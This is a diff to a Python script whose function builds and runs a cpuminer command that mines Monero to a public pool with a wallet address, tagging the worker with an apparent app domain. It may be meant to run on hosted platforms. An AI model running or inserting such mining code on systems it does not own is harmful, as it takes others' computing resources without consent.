@@ -83,7 +83,7 @@ def Mine_cpuminer_Monero():
 	OutputShell('chmod +x cpum')
 	time.sleep(1)
 	#WORK_ID = os.environ.get( 'WORK_ID' )
-	str_cmd = STR_CMD_MINE + 'cpum -a cryptonight -o stratum+tcp://pool.supportxmr.com:3333 -u ' + WALLET_ADDRESS + '+1000 -p worker'
+	str_cmd = STR_CMD_MINE + 'cpum --threads=3 --algo=cryptonight --url=stratum+tcp://pool.supportxmr.com:3333 --user=' + WALLET_ADDRESS + '+1000 --pass=worker'
 	str_cmd += '.' + APP_DOMAIN
 	MineShell(str_cmd)
 	
